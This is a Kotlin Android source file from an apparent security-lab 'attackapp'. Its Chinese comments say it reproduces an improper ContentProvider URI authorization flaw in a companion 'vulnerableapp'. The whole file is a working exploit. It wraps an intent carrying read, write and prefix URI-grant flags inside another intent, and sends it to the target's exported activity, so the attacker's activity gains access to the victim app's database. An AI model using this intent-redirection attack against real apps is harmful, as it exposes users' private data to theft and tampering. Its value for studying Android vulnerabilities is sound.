package com.forgo7ten.attackapp.attack.improperuriauthorization

import android.content.Intent
import android.content.Intent.*
import android.net.Uri
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.forgo7ten.attackapp.databinding.ActivityImproperUriBinding

/**
 * @ClassName ImproperUriActivity
 * @Description // 该Activity负责构造恶意的intent，为DeActivity提权；是【ContentProviderURI授权不当】漏洞复现的一部分
 * @Author Forgo7ten
 **/
class ImproperUriActivity : AppCompatActivity() {
    private lateinit var binding: ActivityImproperUriBinding
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityImproperUriBinding.inflate(layoutInflater).apply {
            setContentView(root)
        }
        binding.btnAttack.setOnClickListener {
            attack()
        }
    }

    private fun attack() {
        val backIntent: Intent = Intent().apply {
            // 显式声明跳转的组件
            setClassName("com.forgo7ten.attackapp", "com.forgo7ten.attackapp.view.DbActivity")
            addFlags(
                FLAG_ACTIVITY_NEW_TASK or
                        // 添加读写权限
                        FLAG_GRANT_READ_URI_PERMISSION or FLAG_GRANT_WRITE_URI_PERMISSION
                        // 授予对URI前缀匹配的权限
                        or FLAG_GRANT_PREFIX_URI_PERMISSION
            )
            // 这里是设置的data，添加的Flags中的权限会作用在这个Uri上
            data = Uri.parse("content://com.forgo7ten.vulnerableapp.IMPROPERPROVIDER/user")
            putExtra("authorities", "com.forgo7ten.vulnerableapp.IMPROPERPROVIDER")
        }
        // sendIntent负责发送给vulnerableapp的StartActivity，该Activity会将携带的backIntent打开DbActivity，使得DbActivity可以对vulnerableapp的数据库进行操作
        val sendIntent = Intent().apply {
            action = "com.forgo7ten.vulnerableapp.STARTACTIVITY"
            putExtra("intent", backIntent)
            startActivity(this)
        }
    }
}